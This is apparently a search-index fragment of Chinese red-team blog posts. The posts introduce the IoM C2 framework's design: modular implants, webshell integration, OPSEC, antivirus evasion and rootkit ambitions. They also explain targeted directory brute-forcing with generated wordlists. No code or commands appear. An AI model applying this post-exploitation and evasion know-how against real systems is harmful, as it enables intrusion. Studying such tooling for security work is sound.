\u6709\u5927\u91cf\u516c\u5f00\u6216\u672a\u516c\u5f00\u7684\u6280\u672f\u5728\u5f00\u6e90\u4e16\u754c\u6216\u8005\u79c1\u4e0b\u6d41\u4f20, \u4f46\u7f3a\u5c11\u4e00\u4e2a\u53ef\u4ee5\u9ad8\u5ea6\u5b9a\u5236\u5316\u7684\u6846\u67b6\u5c06\u8fd9\u4e9b\u72ec\u7acb\u7684\u6280\u672f\u5de5\u7a0b\u5316, \u4f7f\u5176\u53d8\u6210\u4e00\u4e2a\u7edf\u4e00\u7684\u57fa\u7840\u8bbe\u65bd. </p> <p>nighthawk\u4e0ecobaltstrike\u90fd\u662f\u95ed\u6e90\u7684\u5de5\u5177, \u4ed6\u4eec\u867d\u7136\u63d0\u4f9b\u4e86\u5404\u79cd\u63a5\u53e3\u4ee5\u4f9b\u7528\u6237\u5ba2\u5236\u5316, \u4f46\u5728\u6700\u6838\u5fc3\u7684\u90e8\u5206, \u56e0\u4e3a\u7f3a\u5c11\u4ee3\u7801, \u53ea\u80fd\u4f9d\u8d56\u5176\u5b98\u65b9\u8fed\u4ee3. \u5e76\u4e14nighthawk\u4e0ecobaltstrike\u90fd\u6709\u4e25\u683c\u7684\u5bf9\u4e2d\u56fd\u51fa\u53e3\u9650\u5236.</p> <p>\u6700\u91cd\u8981\u7684\u662f, \u56fd\u5185\u7684\u73af\u5883\u8bde\u751f\u4e86\u4e00\u7cfb\u5217\u5f3a\u5927\u7684webshell\u7ba1\u7406\u5de5\u5177, \u4ed6\u4eec\u5b9e\u9645\u4e0a\u4e5f\u662f\u67d0\u79cd\u610f\u4e49\u4e0a\u7684C2, \u4ece\u5de5\u7a0b\u4e0a\u6765\u770b, \u7406\u8bba\u4e0a\u80fd\u5b8c\u5168\u590d\u7528C2\u7684\u540e\u6e17\u900f\u57fa\u5efa.</p> <p>\u53ef\u4ee5\u60f3\u8c61\u4e00\u4e2a\u80fd\u8c03\u7528cobaltstrike\u7684cna\u811a\u672c\u7684\u51b0\u978b/\u54e5\u65af\u62c9\u6709\u591a\u4e48\u5f3a\u5927! </p>"},{"location":"blog/2024/08/16/IoM_introduce/#iom-\u8bbe\u8ba1\u7406\u5ff5","title":"IoM \u8bbe\u8ba1\u7406\u5ff5","text":"<p>\u5f53\u6211\u4eec\u771f\u6b63\u5f00\u59cb\u7740\u624b\u53bb\u5b9e\u73b0\u65f6, \u9047\u5230\u7684\u56f0\u96be\u6bd4\u60f3\u8c61\u591a\u5f97\u591a.</p> <p>\u6211\u4eec\u8c03\u7814\u4e86\u5f00\u6e90\u4e16\u754c\u4e2d\u5927\u90e8\u5206\u77e5\u540dC2\u7684\u67b6\u6784\u4e0e\u5b9e\u73b0, 80%\u4ee5\u4e0aC2\u5b9e\u9645\u4e0a\u53ea\u5b9e\u73b0\u4e86\u547d\u4ee4\u6267\u884c, \u4e0a\u4f20\u4e0b\u8f7d. \u8bf4\u5b9e\u8bdd\u5f88\u96be\u79f0\u5f97\u4e0a\u662fC2.</p> <p>\u4f46\u4e5f\u53d1\u73b0\u4e86\u6709\u51e0\u4e2a\u5b9e\u73b0\u975e\u5e38\u6210\u719f\u7684, \u4ece\u67b6\u6784\u4e0e\u8bbe\u8ba1\u4e0a\u90fd\u975e\u5e38\u4f18\u96c5\u7684\u6846\u67b6. \u4e5f\u5c31\u662f\u5728\u80cc\u666f\u4e2d\u63d0\u5230\u8fc7\u7684sliver, havoc, mythic. \u8fd9\u4e09\u4e2a\u6846\u67b6\u7684\u67b6\u6784\u5b8c\u5168\u4e0d\u540c, \u5404\u6709\u5404\u7684\u4f18\u7f3a\u70b9. </p> <p>\u603b\u7ed3\u51fa\u4e86\u4e00\u4e9b\u4e0b\u4e00\u4ee3C2\u6838\u5fc3\u8bbe\u8ba1\u7406\u5ff5. </p> <ul> <li>rust\u662f\u4e0b\u4e00\u4ee3C2\u7684\u7406\u60f3\u8bed\u8a00, \u63d0\u4f9b\u4e86\u5e95\u5c42\u64cd\u4f5c\u80fd\u529b, \u8de8\u5e73\u53f0\u7f16\u8bd1, \u80fd\u4fee\u6539\u51e0\u4e4e\u4e00\u5207\u7279\u5f81</li> <li>\u6a21\u5757\u5316, \u70ed\u63d2\u62d4, \u9ad8\u5ea6\u53ef\u5b9a\u5236\u7684implant\u8bbe\u8ba1. \u6211\u4eec\u5c06\u4e00\u5207\u529f\u80fd\u90fd\u62c6\u6210\u4e00\u4e2a\u4e00\u4e2a\u79ef\u6728, \u901a\u8fc7rust\u63d0\u4f9b\u7684feature\u4e0e\u6761\u4ef6\u7f16\u8bd1\u5b9e\u73b0\u4efb\u610f\u7ec4\u5408. </li> <li>\u652f\u6301webshell, \u5e76\u6253\u901a\u4e0e\u5e95\u5c42\u7684\u64cd\u4f5c\u80fd\u529b, \u590d\u7528C2\u7684\u63d2\u4ef6\u751f\u6001, \u4f8b\u5982CLR\u751f\u6001\u7684assembly-execute\u7684\u80fd\u529b, java\u7684JNI\u548cJVMTI\u7b49\u7b49.</li> <li>OPSEC\u4f18\u5148, \u5e76\u5c3d\u53ef\u80fd\u5f00\u653e\u7684OPSEC\u81ea\u5b9a\u4e49\u63a5\u53e3</li> <li>\u5728\u6d41\u91cf\u4e0a\u7684\u9ad8\u5ea6\u53ef\u63a7</li> <li>\u4eceC2\u5230bootkit/rootkit</li> <li>listener\u4e0eserver\u8981\u89e3\u8026, \u4e0b\u4e00\u4ee3C2\u5929\u751f\u5c31\u5e94\u8be5\u662f\u5206\u5e03\u5f0f\u7684</li> <li>\u5bf9\u539f\u6709C2\u751f\u6001\u7684\u517c\u5bb9, \u4f8b\u5982CobaltStrike\u7684BOF, Sliver\u7684Armory\u7b49</li> <li>......</li> </ul> <p>\u6211\u4eec\u5c06\u8fd9\u4e9b\u8bbe\u8ba1\u7406\u5ff5\u7ec6\u5316\u6210\u8be6\u7ec6\u7684\u9700\u6c42\u8868, \u5e76\u6b63\u5f0f\u5f00\u59cb\u53bb\u6784\u5efa\u4e0b\u4e00\u4ee3C2.</p> <p></p> <p>\u73b0\u5728\u53ef\u4ee5\u5728 IoM roadmap \u4e2d\u627e\u5230\u6211\u4eec\u7684\u5177\u4f53\u8ba1\u5212\u4e0e\u8def\u7ebf\u56fe.</p>"},{"location":"blog/2024/08/16/IoM_introduce/#snippets","title":"snippets","text":"<p>IoM\u5c06\u5728v0.0.1-community\u53d1\u5e03\u7684\u4e00\u4e9b\u529f\u80fd\u5c55\u793a. </p> <p>\u53cd\u5c04\u52a0\u8f7dEXE\u6587\u4ef6 (headless PE) </p> <p>\u6ce8\u518c\u63d2\u4ef6 </p> <p>unmanaged powershell </p> <p>bof </p> <p>\u8fdb\u7a0b\u5185\u6267\u884c CRL exe </p> <p>And More...</p> <p>\u53ef\u4ee5\u5728\u8fd9\u91cc\u5feb\u901f\u5f00\u59cb\u5c1d\u8bd5IoM: https://chainreactors.github.io/wiki/IoM/quickstart/</p>"},{"location":"blog/2024/08/16/IoM_introduce/#\u9632\u6b62\u6ee5\u7528","title":"\u9632\u6b62\u6ee5\u7528","text":"<p>\u4f5c\u4e3a\u4e00\u4e2a\u5e26\u6709\u653b\u51fb\u6027\u7684\u5de5\u5177, \u6211\u4eec\u77e5\u9053\u8fd9\u4e48\u505a\u7684\u98ce\u9669. \u6211\u4eec\u5728\u516c\u5f00\u8bbe\u8ba1\u7406\u5ff5, \u7a0b\u5e8f\u4ee3\u7801\u7684\u65f6\u5019\u8fdb\u884c\u4e86\u4e00\u5b9a\u7684\u8fc7\u6ee4. \u5c06\u5176\u5206\u4e3a<code>community</code>\u4e0e<code>professional</code> (\u5c06\u4f1a\u6bd4community\u665a\u4e00\u6bb5\u65f6\u95f4\u53d1\u5e03), \u4ee5\u53ca\u672a\u6765\u6709\u53ef\u80fd\u51fa\u73b0\u7684 <code>business</code> . </p> <ul> <li>community<ul> <li>\u5305\u542b\u4e86client/server\u7684\u5b8c\u6574\u4ee3\u7801</li> <li>implant\u7684\u4e3b\u4f53\u7684\u6e90\u4ee3\u7801</li> <li>\u6ca1\u6709\u8fdb\u884cOPSEC\u4f18\u5316 kits\u7684\u7f16\u8bd1\u65f6\u9759\u6001\u5e93\u6587\u4ef6. \u76ee\u524d\u63d0\u4f9b\u4e86win-kit</li> <li>\u6240\u6709\u6709\u5173\u63d2\u4ef6\u5316, \u62d3\u5c55\u80fd\u529b\u7684\u529f\u80fd\u90fd\u5c06\u4f1a\u51fa\u73b0\u5728community\u4e2d.</li> </ul> </li> <li>professional, (\u53d1\u5e03\u65f6\u95f4\u5f85\u5b9a, \u5c31\u5728\u8fd1\u671f, \u53ef\u80fd\u4f1a\u6709\u4e00\u5b9a\u7684\u5b89\u5168\u6027\u5ba1\u6838\u4e0e\u8d21\u732e\u8981\u6c42)<ul> <li>\u514d\u6740\u6846\u67b6, </li> <li>\u8fdb\u884c\u4e86\u5927\u91cfOPSEC\u4f18\u5316\u7684kits</li> <li>\u9ad8\u7ea7\u4ee3\u7406/\u6d41\u91cf\u529f\u80fd</li> </ul> </li> </ul> <p>\u627f\u8bfa * IoM \u5df2\u7ecf\u5f00\u6e90\u7684\u90e8\u5206\u6c38\u8fdc\u4e0d\u4f1a\u8f6c\u4e3a\u95ed\u6e90 * \u5173\u4e8e\u63d2\u4ef6\u5316\u7684\u76f8\u5173\u80fd\u529b(\u4f8b\u5982bof, \u63d2\u4ef6\u4ed3\u5e93)\u7b49\u5c06\u4fdd\u6301\u5f00\u653e * \u6765\u81ea\u793e\u533a\u7684\u8d21\u732e\u5c06\u4fdd\u6301\u5f00\u653e * \u5bf9\u4e8e\u8d21\u732e\u8005\u5c06\u4f1a\u9080\u8bf7\u5176\u53c2\u4e0eProfessional\u7248\u672c\u7684\u6d4b\u8bd5</p>"},{"location":"blog/2024/08/16/IoM_introduce/#redboot\u8ba1\u5212","title":"redboot\u8ba1\u5212","text":"<p>\u4ee5\u7edf\u4e00\u7684\u8bbe\u8ba1\u98ce\u683c\u53bb\u91cd\u6784\u5404\u4e2a\u7ec6\u5206\u9886\u57df\"allinone\"\u5de5\u5177, \u53bb\u5b9e\u73b0\u4ee5\u4eba\u4e3a\u6838\u5fc3\u7684\u7ea2\u961f\u5de5\u5177\u94fe\u4e0e\u5de5\u7a0b\u5316\u5b9e\u8df5, \u6211\u4eec\u5c06\u5176\u547d\u540d\u4e3a\u00a0redboot\u00a0.  \u6700\u7ec8\u8ba1\u5212\u5b9e\u73b0\u9762\u5411\u00a0\u9762\u5411\u7ea2\u961f\u00a0\u7684\u00a0\u4e00\u4f53\u5316\u5e73\u53f0\u00a0,\u63d0\u4f9b\u4e00\u6574\u5957\u5b8c\u6574\u7684\u00a0\u7ea2\u961f\u5de5\u7a0b\u57fa\u7840\u8bbe\u65bd\u00a0.</p> <p>\u901a\u8fc7\u5de5\u4ef6\u4e4b\u95f4\u7684\u00a0\u94fe\u5f0f\u53cd\u5e94\u00a0\u4ee5\u8fbe\u5230\u00a0\u4e34\u754c\u8d28\u91cf\u00a0.</p> <p>IoM\u53ea\u662fredboot\u8ba1\u5212\u7684\u4e09\u4e2a\u652f\u7ebf\u4e4b\u4e00, \u4e5f\u662f\u7b2c\u4e00\u4e2a\u53d1\u5e03\u7684\u652f\u7ebf.  \u672a\u6765\u4e00\u6bb5\u65f6\u95f4\u6211\u4eec\u5c06\u5168\u529b\u7ef4\u62a4\u8fd9\u4e2a\u9879\u76ee.</p> <p>\u5e76\u5728\u8ba1\u5212\u4eca\u5e74\u5185\u53d1\u5e03\u53e6\u5916\u4e24\u6761\u652f\u7ebf\u7684\u7ea2\u961f\u5411\u7684ASM\u4e0e\u6211\u4eec\u7684\u4ee3\u7406\u5de5\u5177. </p>"},{"location":"blog/2024/08/16/IoM_introduce/#thread1-iom","title":"Thread1 IoM","text":"<p>IoM https://chainreactors.github.io/wiki/IoM/</p> <p>IoM(<code>Internet of Malice</code>) \u7684\u5b9a\u4f4d\u662f\u4e0b\u4e00\u4ee3C2\u6846\u67b6, \u540c\u6837\u4ee5\u9ad8\u5ea6\u6a21\u5757\u5316\u4e0e\u53ef\u62d3\u5c55\u6027\u4e3a\u6838\u5fc3\u8bbe\u8ba1\u7406\u5ff5. \u57fa\u4e8e\u8fd9\u4e2a\u7406\u5ff5\u53bb\u5b9e\u73b0\u63d2\u4ef6\u5316\u7684OPSEC, \u63d2\u4ef6\u5316\u7684\u793e\u533a\u751f\u6001, \u63d2\u4ef6\u5316\u7684\u4e00\u5207.</p> <p>\u66f4\u91cd\u8981\u7684\u662f, IoM\u5c06\u7ed3\u5408C2\u4e0ewebshell, \u5c06\u540c\u4e00\u5957\u63d2\u4ef6\u5316\u7684\u57fa\u5efa\u5171\u4eab\u7ed9\u5b8c\u5168\u4e0d\u540c\u7684\u540e\u6e17\u900f\u573a\u666f. </p> <p>IoM\u5373\u5c06\u53d1\u5e03v0.0.1, \u8fd9\u4e2a\u7248\u672c\u79bb\u6211\u4eec\u6700\u521d\u7684v0.0.1\u8bbe\u8ba1\u76ee\u6807\u8fd8\u6709\u5f88\u591a\u9057\u61be, \u4f46\u662f\u4e3a\u4e86\u9632\u6b62\u95ed\u95e8\u9020\u8f66, \u6211\u4eec\u60f3\u63d0\u524d\u4ece\u793e\u533a\u4e2d\u63a5\u6536\u53cd\u9988.</p> <p>\u76ee\u524d\u63d0\u4f9b\u4e86IoM\u7684\u8bbe\u8ba1\u6587\u6863\u4e0e\u7528\u6237\u624b\u518c ,\u53ef\u4ee5\u5728\u8fd9\u91cc\u4f53\u9a8c\u5230IoM\u7684v0.0.1</p>"},{"location":"blog/2024/08/16/IoM_introduce/#thread2-mapping","title":"Thread2 mapping","text":"<p>mapping https://chainreactors.github.io/wiki/mapping/ \u9884\u8ba1\u57282024\u5e74\u5185\u53d1\u5e03</p> <p>ASM\u662fchainreactor\u7684\u521d\u8877, gogo/spray/zombie\u4e4b\u7c7b\u7684\u5de5\u5177\u5b9e\u9645\u4e0a\u90fd\u662f\u4e3a\u4e86\u8fd9\u4e2a\u76ee\u6807\u8bbe\u8ba1\u7684. \u901a\u8fc7\u6781\u9ad8\u7684\u62d3\u5c55\u6027\u4e0e\u7ec6\u7c92\u5ea6\u5b9e\u73b0\u7684\u5b8c\u5168\u53ef\u63a7\u7684\u653b\u51fb\u9762\u7ba1\u7406\u5f15\u64ce.</p> <p>\u73b0\u5728\u8fd9\u4e2a\u76ee\u6807\u5df2\u7ecf\u5b8c\u6210\u4e86v0.0.1, \u4f46\u56e0\u4e3a\u4e00\u4e9b\u6570\u636e\u6e90\u4e0e\u90e8\u7f72\u65b9\u5f0f\u7684\u95ee\u9898, \u6682\u65f6\u65e0\u6cd5\u53d1\u5e03. </p> <p>\u76ee\u524d\u63d0\u4f9b\u4e86mapping\u7684\u8bbe\u8ba1\u6587\u6863, \u53ef\u4ee5\u5728\u8fd9\u91cc\u770b\u5230mapping\u4f5c\u4e3a\u7ea2\u961f\u5411\u7684\u534f\u4f5c\u5f0f\u653b\u51fb\u9762\u5f15\u64ce\u7684\u8bbe\u8ba1\u7406\u5ff5.</p>"},{"location":"blog/2024/08/16/IoM_introduce/#thread3-rem","title":"Thread3 rem","text":"<p>https://chainreactors.github.io/wiki/rem/ \u9884\u8ba1\u57282024\u5e74\u5185\u53d1\u5e03</p> <p>rem\u662f\u5168\u573a\u666f\u7684\u6d41\u91cf/\u4ee3\u7406\u5de5\u5177. \u80fd\u7528\u6765\u89e3\u51b3\u7edd\u5927\u591a\u6570\u573a\u666f\u7684\u4ee3\u7406\u4e0e\u8f6c\u53d1\u9700\u6c42, \u4e5f\u7528\u6765\u6253\u901amapping\u4e0eIoM, \u8ba9mapping\u80fd\u901a\u8fc7rem+IoM\u63a5\u5165\u5185\u7f51. rem\u63d0\u4f9b\u4e86\u5728\u4f20\u8f93\u5c42, \u5e94\u7528\u5c42, \u52a0\u5bc6\u5c42, \u6df7\u6dc6\u5c42\u7684\u62d3\u5c55\u63a5\u53e3. \u53ef\u4ee5\u88ab\u8f7b\u677e\u4fee\u6539\u4e3a\u81ea\u5b9a\u4e49\u7279\u5f81, \u4e5f\u5c06\u662fIoM\u5728\u6d41\u91cf\u7aef\u7684\u80fd\u529b\u62d3\u5c55. </p> <p>\u76ee\u524d\u63d0\u4f9b\u4e86rem\u7684\u8bbe\u8ba1\u6587\u6863 \u4e0e \u8def\u7ebf\u56fe</p>"},{"location":"blog/2024/08/16/IoM_introduce/#\u53ef\u80fd\u4f1a\u5b58\u5728\u7684\u5546\u4e1a\u5316\u8ba1\u5212","title":"\u53ef\u80fd\u4f1a\u5b58\u5728\u7684\u5546\u4e1a\u5316\u8ba1\u5212","text":"<p>\u73b0\u5728redboot\u76f8\u5173\u7684\u9879\u76ee\u9010\u6e10\u4ece\u73a9\u7968\u6027\u8d28\u8f6c\u4e3a\u4e86\u4e3b\u4e1a. \u6211\u4eec\u6682\u65f6\u901a\u8fc7\u5176\u4ed6\u6765\u6e90\u7684\u6536\u5165\u652f\u6301\u8fd9\u4e2a\u8ba1\u5212, \u4f46redboot\u7684\u7ec8\u6781\u5f62\u6001\u592a\u8fc7\u6709\u5438\u5f15\u529b, \u51e0\u4e4e\u662f \u4e00\u4f53\u5316\u653b\u51fb\u5e73\u53f0 \u7684 \u7406\u60f3\u5f62\u6001 . \u8fd9\u4e2a\u5438\u5f15\u529b\u4e0d\u53ea\u662f\u5bf9\u4ee5\u6280\u672f\u4e3a\u8ffd\u6c42\u76ee\u6807\u7684\u4eba\u6765\u8bf4\u7684, \u5e94\u8be5\u5bf9\u4e8e\u6240\u6709\u6709\u9700\u6c42\u7684\u4eba\u6765\u8bf4\u90fd\u662f\u540c\u6837\u7684. \u56e0\u6b64, \u6211\u4eec\u8ba4\u4e3a\u5b58\u5728\u5546\u4e1a\u5316\u7684\u6f5c\u529b, \u6709\u4efb\u4f55\u7c7b\u4f3c\u9700\u6c42\u7684\u5173\u6ce8\u8005\u6b22\u8fce\u4e0e\u6211\u4eec\u6c9f\u901a\u60a8\u7684\u9700\u6c42 . </p>"},{"location":"blog/2023/12/31/spray-introduce/","title":"\u4e3a\u4ec0\u4e48\u6211\u4eec\u9700\u8981\u6536\u96c6url","text":"<p>Next Generation HTTP Dir/File Fuzz Tool: https://github.com/chainreactors/spray</p> <p>Fast passive URL enumeration Tool: https://github.com/chainreactors/urlfounder</p>"},{"location":"blog/2023/12/31/spray-introduce/#\u4e3a\u4ec0\u4e48\u6211\u4eec\u9700\u8981\u6536\u96c6url","title":"\u4e3a\u4ec0\u4e48\u6211\u4eec\u9700\u8981\u6536\u96c6URL?","text":"<p>\u8fd9\u4e2a\u95ee\u9898\u4f3c\u4e4e\u5728\u6700\u57fa\u7840\u7684\u5b89\u5168\u5c97\u9762\u8bd5\u4e2d\u90fd\u4e0d\u592a\u53ef\u80fd\u51fa\u73b0,\u4f46\u5982\u679c\u8981\u5f7b\u5e95\u7406\u89e3dir/file fuzz,\u6211\u4eec\u9700\u8981\u5148\u641e\u6e05\u695a\u8fd9\u4e2a\u95ee\u9898\u3002</p> <p>\u5982\u679c\u4f60\u6bcf\u6b21\u90fd\u4f1a\u62ff\u8d77\u81ea\u5df1\u73cd\u85cf\u7684\u5b57\u5178\u5bf9\u7740\u76ee\u6807\u4e00\u987f\u8f70\u70b8,\u90a3\u4e48\u53ef\u80fd\u9700\u8981\u597d\u597d\u60f3\u60f3\u76ee\u5f55\u91cc\u7684<code>user.php</code> \u771f\u7684\u6709\u7528\u4e48\u3002 \u5982\u679c\u6709\u7528,\u7528\u722c\u866b\u4e0d\u662f\u66f4\u597d\u4e48?</p> <p>\u5728\u7ea2\u84dd\u5bf9\u6297\u4e2d,\u8d44\u4ea7\u7684\u6700\u5c0f\u5355\u4f4d\u4e3a\u4e00\u4e2a service,\u8fd9\u4e2a service\u53ef\u4ee5\u7406\u89e3\u4e3a\u90e8\u7f72\u5728\u67d0\u4e00\u53f0\u670d\u52a1\u5668\u4e0a\u7684\u670d\u52a1\u3002\u4f8b\u5982\u4e00\u4e2a\u8bba\u575b\u670d\u52a1,\u91cc\u9762\u53ef\u80fd\u6709 user.php,forum.php \u7b49\u7b49\u4e00\u5806\u76ee\u5f55\u3002\u4f46\u5bf9\u653b\u51fb\u8005\u6765\u8bf4,\u53ea\u9700\u8981\u77e5\u9053\u6307\u7eb9,\u8fd9\u4e9b\u76ee\u5f55\u90fd\u53ef\u4ee5\u4ece\u6e90\u7801\u4e2d\u76f4\u63a5\u627e\u5230,  \u5e76\u4e0d\u9700\u8981\u7206\u7834\u3002\u800c\u5982\u679c\u662f\u4e0d\u5f00\u6e90\u7684\u5e94\u7528, \u8fd9\u4e9b\u76ee\u5f55\u53ef\u4ee5\u901a\u8fc7\u722c\u866b\u53bb\u53d1\u73b0\u3002\u8fd9\u6837\u7684\u4e00\u4e2a\u9875\u9762 \u5728\u7ea2\u84dd\u5bf9\u6297,\u751a\u81f3\u5927\u90e8\u5206\u6e17\u900f\u6d4b\u8bd5\u4e2d\u90fd\u4e0d\u9700\u8981\u901a\u8fc7\u7206\u7834\u53bb\u53d1\u73b0\u3002</p> <p>\u53ea\u6709\u95ed\u6e90\u7684, \u4e14\u7ba1\u7406\u9875\u9762\u505a\u4e86\u7279\u6b8a\u4fdd\u62a4\u7684\u7ad9\u70b9, \u624d\u9700\u8981\u901a\u8fc7\u76ee\u5f55\u7206\u7834\u53bb\u53d1\u73b0admin\u76ee\u5f55. user.php, register.php\u5728html\u4e0ejs\u4e2d\u5c31\u80fd\u88ab\u722c\u866b\u722c\u5230. </p>"},{"location":"blog/2023/12/31/spray-introduce/#\u90a3\u4ec0\u4e48\u6837\u7684\u573a\u666f\u624d\u9700\u8981\u7206\u7834","title":"\u90a3\u4ec0\u4e48\u6837\u7684\u573a\u666f\u624d\u9700\u8981\u7206\u7834?","text":"<p>URL\u7206\u7834\u662f\u4e00\u4e2a\u6210\u672c\u5f88\u5927, \u52a8\u9759\u5f88\u5927\u7684\u884c\u4e3a, \u6240\u4ee5\u9700\u8981\u5e26\u6709\u76ee\u7684\u6027. \u4e00\u5b9a\u9700\u8981\u7206\u7834\u7684\u573a\u666f\u4f8b\u5982</p> <ol> <li>\u53d1\u73b0\u914d\u7f6e\u6587\u4ef6 (git, svn, sbom, config, env\u7b49)</li> <li>\u7279\u5b9a\u6307\u7eb9/\u6f0f\u6d1e\u7684url</li> <li>\u53d1\u73b0\u5907\u4efd\u6587\u4ef6</li> <li>\u53d1\u73b0\u57fa\u4e8eurl/\u57fa\u4e8ehost\u53cd\u4ee3\u7684\u8def\u7531</li> <li>\u6839\u636e\u7ad9\u70b9\u7279\u5f81\u53d1\u73b0\u654f\u611fapi</li> </ol> <p>\u5176\u4e2d\u53ea\u67091,2 \u662f\u901a\u7528\u7684, 345\u662f\u9700\u8981\u6839\u636e\u76ee\u6807\u53bb\u5b9a\u5236\u5b57\u5178\u7684.  </p> <p>\u5c0f\u7ed3:\u76ee\u5f55\u7206\u7834\u4e0d\u662f\u4e3a\u4e86\u53d1\u73b0\u66f4\u591a\u7684 URL,\u800c\u662f\u53bb\u53d1\u73b0\u66f4\u591a\u6709\u7528\u7684 URL\u3002</p>"},{"location":"blog/2023/12/31/spray-introduce/#\u600e\u4e48\u7206\u7834\u76ee\u5f55\u6587\u4ef6","title":"\u600e\u4e48\u7206\u7834\u76ee\u5f55/\u6587\u4ef6?","text":"<p>\u5f53\u6211\u62ff\u8d77dirbuster, dirsearch, dirmap, gobuster, fexobuster, ffuf\u7b49\u7b49\u4e00\u7cfb\u5217\u4f3c\u4e4e\u662f\u4e3a\u4e86\u89e3\u51b3\u8fd9\u4e2a\u9700\u6c42\u7684\u5de5\u5177\u65f6, \u7b2c\u4e00\u53cd\u5e94\u5c31\u662f\u5b57\u5178\u600e\u4e48\u529e\uff1f\u6216\u591a\u6216\u5c11\u6709\u4e9b\u4e0d\u987a\u624b(ffuf\u662f\u5176\u4e2d\u6700\u987a\u624b\u7684). \u76f8\u4fe1\u4e0d\u6b62\u6211\u6709\u8fd9\u4e2a\u611f\u89c9.  \u5f53\u7136\u672c\u6587\u7684\u91cd\u70b9\u4e0d\u662f\u5bf9\u6bd4\u5404\u79cd\u5de5\u5177\u7684\u6027\u80fd, \u7ec6\u8282, \u7528\u6cd5. </p> <p>\u4ed6\u4eec\u89e3\u51b3\u95ee\u9898\u7684\u65b9\u5f0f\u5927\u540c\u5c0f\u5f02, \u53ef\u4ee5\u7406\u89e3\u6210\u624b\u4e0a\u6709\u4e00\u4e2a\u5b57\u5178, \u7136\u540e\u4f9d\u6b21\u628a\u6bcf\u4e2a\u5305\u6253\u8fc7\u53bb, \u83b7\u53d6\u4e00\u4e9b\u4fe1\u606f. \u7136\u800c\u5728\u591a\u5e74\u7684\u5b9e\u6218\u4e2d, \u6211\u53d1\u73b0\u5927\u90e8\u5206\u65f6\u5019\u90fd\u627e\u4e0d\u5230\u4e00\u4e2a<code>allinone</code>\u7684\u5b57\u5178. \u6709\u4e00\u4e9b\u5f00\u6e90\u7684\u9879\u76ee\u6216\u8005\u5927\u4f6c\u624b\u4e0a\u7684\u76ee\u5f55\u5b57\u5178\u90fd\u5230\u4e86\u5341\u51e0\u4e07\u751a\u81f3\u51e0\u5341\u4e07\u51e0\u767e\u4e07\u91cf\u7ea7. \u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\u7684\u65b9\u5f0f\u4f3c\u4e4e\u5c31\u53d8\u6210\u4e86\u627e\u5230\u4e00\u4e2a\u66f4\u5168\u7684\u5b57\u5178.  \u4e0d\u65ad\u589e\u957f\u7684\u5b57\u5178\u53ef\u4ee5\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\u4e48? </p> <p>\u7ecf\u5e38\u5728\u56fd\u5185\u505a\u6e17\u900f\u670d\u52a1\u7684\u670b\u53cb\u4eec\u5e94\u8be5\u90fd\u9047\u5230\u8fc7\u4f8b\u5982 <code>hzzx</code>, <code>smsbk</code>\u8fd9\u6837\u7684\u4e0d\u77e5\u6240\u4ee5\u7136, \u4f46\u603b\u611f\u89c9\u6709\u89c4\u5f8b\u7684\u76ee\u5f55.  \u5982\u679c\u6210\u529f\u6253\u8fdb\u53bb, \u53ef\u80fd\u5c31\u80fd\u77e5\u9053\u8fd9\u4e9b\u5b57\u6bcd\u8868\u793a\u7684\u542b\u4e49. <code>hzzx</code> \u8868\u793a\u7684\u662f<code>\u676d\u5dde\u4e2d\u5fc3</code> , <code>smsbk</code> \u8868\u793a\u7684\u662f<code>\u5e02\u6c11\u793e\u4fdd\u5361</code>. \u5982\u679c\u8981\u628a\u8fd9\u79cd\u76ee\u5f55\u52a0\u5230\u5b57\u5178\u91cc, \u90a3\u4e483\u4f4d\u5c0f\u5199\u968f\u673a\u5b57\u6bcd\u670917576, 4\u4f4d\u6709456976, 5\u4f4d\u5c31\u670911881376. \u5982\u679c\u6709\u5927\u5199\u5b57\u6bcd\u6216\u8005\u6570\u5b57\u52a0\u5165, \u5c31\u66f4\u52a0\u5938\u5f20\u4e86.  </p> <p>\u800c\u8fd9\u6837\u7684\u76ee\u5f55\u5728\u5f53\u524d\u7f51\u7edc\u67b6\u6784\u4e0b\u975e\u5e38\u5e38\u89c1, \u7ecf\u5e38\u53ef\u4ee5\u9047\u5230\u67d0\u4e2a\u94f6\u884c\u4f7f\u7528\u4e00\u53f0\u673a\u5668\u53cd\u4ee3\u4e86\u591a\u4e2a\u670d\u52a1, \u901a\u8fc7url/host\u533a\u5206\u540e\u7aef\u5730\u5740. </p> <p>\u5982\u679c\u91c7\u7528\u4f20\u7edf\u7684\u57fa\u4e8e\u5b57\u5178\u7684\u76ee\u5f55\u7206\u7834, \u8fd9\u6837\u7684\u76ee\u5f55\u5728\u6240\u6709\u7684\u5de5\u5177\u9762\u524d\u90fd\u662f\u9690\u5f62\u7684. \u6211\u5728github\u4e0a\u7c97\u7565\u6d4f\u89c8\u4e86\u5404\u79cd\u76ee\u5f55\u5b57\u5178, \u76ee\u524d\u8fd8\u6ca1\u6709\u53d1\u73b0\u80fd\u6db5\u76d6\u4e0a\u8ff0\u5e38\u89c1\u7684. \u4f46\u5c31\u7b97\u751f\u6210\u4e86\u8fd9\u6837\u7684\u5b57\u5178, \u4e00\u5343\u591a\u4e07\u7684\u53d1\u5305\u6570\u91cf\u672c\u8eab\u5c31\u4e0d\u592a\u53ef\u88ab\u63a5\u53d7. </p> <p>\u4e0a\u9762\u4e5f\u63d0\u5230\u4e86, \u57fa\u4e8e\u5b57\u5178\u7684\u76ee\u5f55\u7206\u7834\u53ea\u80fd\u89e3\u51b31,2\u573a\u666f. \u7edd\u5927\u90e8\u5206\u573a\u666f\u4e0d\u662f\u901a\u8fc7\u5b57\u5178\u79ef\u7d2f\u89e3\u51b3\u7684. </p>"},{"location":"blog/2023/12/31/spray-introduce/#\u90a3\u8be5\u5982\u4f55\u7206\u7834\u5462","title":"\u90a3\u8be5\u5982\u4f55\u7206\u7834\u5462?","text":"<p>\u901a\u8fc7\u521a\u624d\u7684\u4f8b\u5b50\u719f\u6089hashcat\u7684\u670b\u53cb\u53ef\u80fd\u4f1a\u53d1\u73b0, \u8fd9\u79cd\u9700\u6c42\u4e0e\u6784\u9020\u5bc6\u7801\u5b57\u5178\u65f6\u662f\u975e\u5e38\u76f8\u4f3c\u7684. \u53ea\u9700\u8981\u901a\u8fc7hashcat hybrid, \u5373\u53ef\u751f\u6210\u5b57\u5178, \u4f8b\u5982\u5df2\u77e5\u67d0\u4e2a\u94f6\u884c\u7684\u540e\u7f00\u5e26\u6709b, \u90a3\u4e48\u7206\u7834\u7684\u7a7a\u95f4\u6307\u6570\u7ea7\u5f97\u4e0b\u964d.  </p> 